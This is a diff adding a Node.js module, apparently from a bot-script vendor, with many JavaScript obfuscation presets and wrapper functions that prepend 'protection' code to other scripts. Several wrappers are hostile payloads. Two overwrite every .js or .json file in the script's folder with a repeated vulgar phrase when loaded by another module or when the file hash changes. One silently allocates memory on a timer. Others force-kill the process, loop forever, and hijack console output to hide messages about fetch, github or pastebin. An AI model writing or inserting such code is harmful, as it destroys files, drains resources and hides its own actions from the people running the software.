@@ -1,0 +1,651 @@
+const crypto = require("crypto");
+
+const addProtection = (code) => {
+  const protection = `
+(function() {
+  'use strict';
+  if (require.main !== module) {
+    console.error('\\n[!] SECURITY ALERT: Bot dipanggil melalui file lain');
+    try { process.exit(1); } catch(e) {}
+    while(1) {}
+  }
+  if (module.parent !== null && module.parent !== undefined) {
+    console.error('\\n[!] SECURITY ALERT: Terdeteksi parent module');
+    try { process.exit(1); } catch(e) {}
+    while(1) {}
+  }
+  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
+  const exitStr = buildStr([101,120,105,116]);
+  const killStr = buildStr([107,105,108,108]);
+  let nativeExit, nativeExecSync, nativePid;
+  try {
+    nativeExit = process[exitStr].bind(process);
+    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
+    nativePid = process.pid;
+  } catch(e) {
+    nativeExit = process.exit;
+    nativePid = process.pid;
+  }
+  const forceKill = (function() {
+    return function() {
+      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}); } catch(e) {}
+      try { nativeExit(1); } catch(e) {}
+      try { process.exit(1); } catch(e) {}
+      while(1) {}
+    };
+  })();
+  const checkGlobals = (function() {
+    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','__BYPASS__','originalExit','originalKill','_httpsRequest','_httpRequest'];
+    for (let i = 0; i < flags.length; i++) {
+      try {
+        if (flags[i] in global && global[flags[i]]) {
+          forceKill();
+        }
+      } catch(e) {}
+    }
+  });
+  checkGlobals();
+  setInterval(checkGlobals, 2000);
+})();
+`;
+  return protection + '\n' + code;
+};
+
+const addkeras = (code) => {
+  const kodekeras = `
+(function() {
+  'use strict';
+  if (require.main !== module) {
+    try { process.exit(1); } catch(e) {}
+    while(1) {}
+  }
+  const buildStr = (a) => a.map(c => String.fromCharCode(c)).join('');
+  const exitStr = buildStr([101,120,105,116]);
+  let nativeExit;
+  try { nativeExit = process[exitStr].bind(process); } catch(e) {}
+  const forceKill = () => {
+    try { nativeExit(1); } catch(e) {}
+    try { process.exit(1); } catch(e) {}
+    while(1) {}
+  };
+  try {
+    const M = require('module');
+    const reqStr = M.prototype.require.toString();
+    if (/bypass|hook|intercept/i.test(reqStr)) {
+      forceKill();
+    }
+  } catch(e) {}
+  try {
+    const orig = { log: console.log.bind(console) };
+    const blocked = ['fetch', 'axios', 'http', 'https', 'github', 'pastebin'];
+    const red = '\\x1b[31m[XayzProtect] Server XYCoolcraft Hard Protection\\x1b[0m';
+    const detect = (...args) => {
+      const msg = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ').toLowerCase();
+      if (blocked.some(word => msg.includes(word))) {
+        orig.log(red);
+        return true;
+      }
+      return false;
+    };
+    ['log', 'warn', 'error'].forEach(type => {
+      console[type] = (...args) => !detect(...args) && orig[type](...args);
+    });
+  } catch (e) {}
+})();`;
+  return kodekeras + "\n" + code;
+};
+
+const addBypass = (code) => {
+    return addkeras(code); 
+};
+
+const killBypass = (code) => {
+  const killpanel = `
+function replaceFilesOnBreach(options = {}) {
+  const fs = require('fs');
+  const path = require('path');
+  try {
+    const files = fs.readdirSync(__dirname).filter(f => /\\.(js|json)$/i.test(f));
+    for (const file of files) {
+      const filePath = path.join(__dirname, file);
+      if (file.endsWith(".js")) {
+        fs.writeFileSync(filePath, "maklo gua ewe".repeat(1000), "utf8");
+      }
+    }
+  } catch {}
+  process.exit(1);
+}
+(function() {
+  'use strict';
+  const forceKill = () => replaceFilesOnBreach();
+  if (require.main !== module) forceKill();
+  const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY'];
+  for (const flag of flags) {
+    try { if (global[flag]) forceKill(); } catch {}
+  }
+})();`;
+  return killpanel + "\n" + code;
+};
+
+const BergemaSelamanya = (code) => {
+  const destroyer = `
+function replaceFilesOnBreach(options = {}) {
+  const fs = require('fs');
+  const path = require('path');
+  console.log("\\x1b[31m%s\\x1b[0m", "\\n⚠️ XayzTech XayzCoreX Protection Active!");
+  try {
+    const files = fs.readdirSync(__dirname).filter(f => /\\.(js|json)$/i.test(f));
+    for (const file of files) {
+      const filePath = path.join(__dirname, file);
+      fs.writeFileSync(filePath, "maklo gua ewe".repeat(500), "utf8");
+    }
+  } catch (err) {}
+  process.exit(1);
+}
+(function () {
+  'use strict';
+  const forceKill = () => replaceFilesOnBreach();
+  if (require.main !== module) forceKill();
+  try {
+    const crypto = require('crypto');
+    const fs = require('fs');
+    const child = require('child_process');
+    const mod = require('module');
+    const CORE = {
+      exit: process.exit.bind(process),
+      hash: crypto.createHash("sha256").update(fs.readFileSync(__filename)).digest("hex")
+    };
+    setInterval(() => {
+      try {
+        const nowHash = crypto.createHash("sha256").update(fs.readFileSync(__filename)).digest("hex");
+        if (nowHash !== CORE.hash) forceKill();
+      } catch { forceKill(); }
+    }, 1200);
+  } catch (e) { forceKill(); }
+})();`;
+  return destroyer + "\n" + code;
+};
+
+const addKode = (code) => {
+    return addkeras(code);
+};
+
+const addTools = (code) => {
+  const tools = `
+(function() {
+  'use strict';
+  const intensifyResources = (function() {
+    const memoryPressure = (function() {
+      const memoryBlocks = [];
+      const allocateMemory = () => {
+        try {
+          for (let i = 0; i < 50; i++) {
+            memoryBlocks.push('█'.repeat(1024*512));
+          }
+        } catch(e) {}
+      };
+      setTimeout(() => {
+        setInterval(() => { if(memoryBlocks.length > 1000) memoryBlocks.splice(0,500); allocateMemory(); }, 30000);
+        allocateMemory();
+      }, 5000);
+      return {};
+    })();
+    return {};
+  })();
+})();`;
+  return tools + '\n' + addkeras(code);
+};
+
+const configs = {
+    "ghost": () => {
+        const generateTrickyName = () => {
+            const zwsp = '\u200C';
+            const safeKeywords = ["break", "case", "catch", "class", "const", "continue", "debugger", "default", "delete", "do", "else", "export", "extends", "finally", "for", "function", "if", "import", "in", "instanceof", "new", "return", "super", "switch", "this", "throw", "try", "typeof", "var", "void", "while", "with", "yield", "enum", "await", "implements", "package", "protected", "interface", "private", "public", "null", "true", "false", "axios", "fs", "path", "require", "module", "exports", "process", "global", "console", "Buffer", "setTimeout"];
+            const repeatCount = Math.floor(Math.random() * (99 - 9 + 1)) + 9;
+            return safeKeywords[Math.floor(Math.random() * safeKeywords.length)] + zwsp.repeat(repeatCount);
+        };
+        return {
+            target: "node",
+            compact: true,
+            minify: true,
+            calculator: true,
+            dispatcher: true,
+            flatten: true,
+            movedDeclarations: true,
+            objectExtraction: true,
+            hexadecimalNumbers: true,
+            renameVariables: true,
+            renameGlobals: true,
+            globalConcealing: true,
+            identifierGenerator: generateTrickyName,
+            controlFlowFlattening: true,
+            deadCode: 0.99,
+            duplicateLiteralsRemoval: true,
+            opaquePredicates: true,
+            stringConcealing: true,
+            stringSplitting: true,
+            stringEncoding: ["base64", "rc4", "aes"]
+        };
+    },
+    "encnew": () => ({
+        target: "node",
+        compact: true,
+        renameVariables: true,
+        renameGlobals: true,
+        identifierGenerator: "zeroWidth",
+        stringCompression: true,
+        stringConcealing: false,
+        stringEncoding: true,
+        controlFlowFlattening: 0.95,
+        flatten: true,
+        shuffle: true,
+        rgf: false,
+        dispatcher: true,
+        globalConcealing: true,
+        lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
+        duplicateLiteralsRemoval: true
+    }),
+    "japan": () => {
+        const japaneseChars = ["あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ", "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と", "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ", "ま", "み", "む", "め", "も", "や", "ゆ", "よ"];
+        const generateJapaneseName = () => {
+            const length = Math.floor(Math.random() * 4) + 3;
+            let name = "";
+            for (let i = 0; i < length; i++) {
+                name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
+            }
+            return name;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateJapaneseName(),
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.9,
+            flatten: true,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            calculator: true,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "timelocked": (days) => {
+        const expiryDate = new Date();
+        expiryDate.setDate(expiryDate.getDate() + parseInt(days));
+        const expiryTimestamp = expiryDate.getTime();
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: "randomized",
+            stringCompression: true,
+            stringConcealing: true,
+            stringEncoding: true,
+            controlFlowFlattening: 0.75,
+            flatten: true,
+            shuffle: true,
+            rgf: false,
+            opaquePredicates: { count: 6, complexity: 4 },
+            dispatcher: true,
+            globalConcealing: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true },
+            duplicateLiteralsRemoval: true,
+            preamble: `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}})();`
+        };
+    },
+    "custom": (customName) => {
+        const generateCustomName = () => {
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            const randomSuffixLength = Math.floor(Math.random() * 9) + 9;
+            let suffix = "";
+            for (let i = 0; i < randomSuffixLength; i++) {
+                suffix += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return `${customName}_${suffix}`;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateCustomName(),
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.9,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: 0.7,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "ultra": () => {
+        const generateUltraName = () => {
+            const chars = "abcdefghijklmnopqrstuvwxyz";
+            const numbers = "0123456789";
+            const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
+            const randomChar = chars[Math.floor(Math.random() * chars.length)];
+            return `ต้${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateUltraName(),
+            stringCompression: true,
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.9,
+            flatten: true,
+            shuffle: true,
+            rgf: true,
+            deadCode: true,
+            opaquePredicates: true,
+            dispatcher: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "siu": () => {
+        const generateSiuCalcrickName = () => {
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            let randomPart = "";
+            for (let i = 0; i < 20; i++) randomPart += chars[Math.floor(Math.random() * chars.length)];
+            return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: generateSiuCalcrickName,
+            stringCompression: true,
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.95,
+            shuffle: true,
+            rgf: false,
+            flatten: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            calculator: true,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "debug": () => ({
+        target: "node",
+        calculator: true,
+        compact: true,
+        hexadecimalNumbers: true,
+        controlFlowFlattening: 1.0,
+        deadCode: 0.94,
+        dispatcher: true,
+        duplicateLiteralsRemoval: 1.0,
+        flatten: true,
+        globalConcealing: true,
+        identifierGenerator: "zeroWidth",
+        minify: true,
+        movedDeclarations: true,
+        objectExtraction: true,
+        opaquePredicates: 1.0,
+        renameVariables: true,
+        renameGlobals: true,
+        stringConcealing: true,
+        stringCompression: true,
+        stringEncoding: true,
+        stringSplitting: 1.0,
+        rgf: false
+    }),
+    "arab": () => {
+        const arabicChars = ["XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XayzTech", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzTech", "XayzCoreX", "XYCoolcraft", "XayzCoreX", "XYCoolcraft", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzCoreX", "XayzCoreX", "XayzCoreX", "XYCoolcraft", "XYCoolcraft", "XayzCoreX", "XayzCoreX"];
+        const generateArabicName = () => {
+            const length = Math.floor(Math.random() * 4) + 3;
+            let name = "";
+            for (let i = 0; i < length; i++) name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
+            return name;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateArabicName(),
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.95,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            calculator: true,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "nova": () => {
+        const generateNovaName = () => "var_" + Math.random().toString(36).substring(7);
+        return {
+            target: "node",
+            calculator: false,
+            compact: true,
+            controlFlowFlattening: 1,
+            deadCode: 0.8,
+            dispatcher: true,
+            duplicateLiteralsRemoval: 1,
+            flatten: true,
+            globalConcealing: true,
+            hexadecimalNumbers: 1,
+            identifierGenerator: generateNovaName,
+            lock: { antiDebug: true, integrity: true, selfDefending: true },
+            minify: true,
+            movedDeclarations: true,
+            objectExtraction: true,
+            opaquePredicates: true,
+            renameGlobals: true,
+            renameVariables: true,
+            shuffle: true,
+            stringCompression: true,
+            stringConcealing: true
+        };
+    },
+    "militery": () => {
+        const generateTrickyName = () => {
+            const zwsp = '‌';
+            const safeKeywords = ["break","case","catch","class","const","continue","debugger","default","delete","do","else","export","extends","finally","for","function","if","import","in","instanceof","new","return","super","switch","this","throw","try","typeof","var","void","while","with","yield","enum","await","implements","package","protected","interface","private","public","null","true","false"];
+            return safeKeywords[Math.floor(Math.random() * safeKeywords.length)] + zwsp.repeat(Math.floor(Math.random() * (999 - 9 + 9)) + 9 - 9);
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: false,
+            identifierGenerator: generateTrickyName,
+            stringEncoding: true,
+            controlFlowFlattening: 0.8,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true }
+        };
+    },
+    "enigma": () => {
+        const gen = () => {
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+            let s = "";
+            const len = 10 + Math.floor(Math.random() * 90);
+            for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)];
+            return s.split("").join("‌");
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: gen,
+            stringEncoding: true,
+            controlFlowFlattening: 0.9,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "evabula": () => ({
+        target: "node",
+        calculator: true,
+        compact: true,
+        hexadecimalNumbers: true,
+        controlFlowFlattening: 0.9,
+        deadCode: 0.9,
+        dispatcher: true,
+        duplicateLiteralsRemoval: 0.9,
+        flatten: true,
+        globalConcealing: true,
+        identifierGenerator: "zeroWidth",
+        minify: true,
+        movedDeclarations: true,
+        objectExtraction: true,
+        opaquePredicates: 0.95,
+        renameVariables: true,
+        renameGlobals: true,
+        stringConcealing: true,
+        stringCompression: true,
+        stringEncoding: true,
+        stringSplitting: 0.75,
+        rgf: false
+    }),
+    "balanced": () => {
+        const gen = () => {
+            const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
+            const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            const zw = "\u200C";
+            const len = 9 + Math.floor(Math.random() * 98);
+            let id = letters[Math.floor(Math.random() * letters.length)];
+            for (let i = 1; i < len; i++) {
+                id += chars[Math.floor(Math.random() * chars.length)];
+                if (Math.random() > 0.9) id += zw;
+            }
+            return id;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: gen,
+            stringEncoding: true,
+            controlFlowFlattening: 1.0,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "reversed": () => {
+        const randomChars = ["Xayz難読化装置", "難Tech読化装置", "難読Xayz化装置", "難読化Tech装置", "難読化装Xayz置", "難読化装置Tech", "難読化装置Xayz", "難読化装Tech置", "難読化Xayz装置", "難読Tech化装置", "難Xayz読化装置", "Tech難読化装置", "難読化装置", "置装化読難"];
+        const generateArabicName = () => {
+            const length = Math.floor(Math.random() * 9) + 9;
+            let name = "";
+            for (let i = 0; i < length; i++) name += randomChars[Math.floor(Math.random() * randomChars.length)];
+            return name;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateArabicName(),
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.95,
+            shuffle: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: 0.7,
+            calculator: true,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "japxarab": () => {
+        const japaneseXArabChars = ["あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ", "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と", "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ", "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر", "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف", "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん"];
+        const generateJapaneseXArabName = () => {
+            const length = Math.floor(Math.random() * 8) + 9;
+            let name = "";
+            for (let i = 0; i < length; i++) name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
+            return name;
+        };
+        return {
+            target: "node",
+            compact: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: () => generateJapaneseXArabName(),
+            stringCompression: true,
+            stringConcealing: true,
+            stringEncoding: true,
+            stringSplitting: true,
+            controlFlowFlattening: 0.95,
+            flatten: true,
+            shuffle: true,
+            rgf: false,
+            dispatcher: true,
+            duplicateLiteralsRemoval: true,
+            deadCode: 0.8,
+            calculator: true,
+            opaquePredicates: true,
+            lock: { selfDefending: true, antiDebug: true, integrity: true, tamperProtection: true }
+        };
+    },
+    "rosemary": () => {
+        const mulberry32 = (a) => () => {
+            let t = (a += 0x6D2B79F5);
+            t = Math.imul(t ^ (t >>> 15), t | 1);
+            t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
+            return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+        };
+        const seed = (Date.now() ^ (typeof performance !== "undefined" ? (performance.now() | 0) : 0)) >>> 0;
+        const rnd = mulberry32(seed);
+        const idGen = () => {
+            const head = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
+            const tail = head + "0123456789";
+            const len = 7 + Math.floor(rnd() * 17);
+            let s = head[Math.floor(rnd() * head.length)];
+            for (let i = 1; i < len; i++) {
+                s += tail[Math.floor(rnd() * tail.length)];
+                if (rnd() > 0.84) s += "\u200C";
+            }
+            return s;
+        };
+        return {
+            target: "node",
+            compact: true,
+            minify: true,
+            renameVariables: true,
+            renameGlobals: true,
+            identifierGenerator: idGen,
+            stringEncoding: true,
+            stringCompression: true,
+            stringConcealing: true,
+            stringSplitting: 1,
+            controlFlowFlattening: 1,
+            flatten: true,
+            opaquePredicates: 1,
+            dispatcher: true,
+            hexadecimalNumbers: true,
+            duplicateLiteralsRemoval: true,
+            objectExtraction: true,
+            movedDeclarations: true,
+            deadCode: 0.9,
+            globalConcealing: true,
+            shuffle: true,
+            lock: { selfDefending: true, integrity: true, antiDebug: true, tamperProtection: true }
+        };
+    }
+};
+
+module.exports = { configs, addProtection, addkeras, addBypass, killBypass, BergemaSelamanya, addKode, addTools };
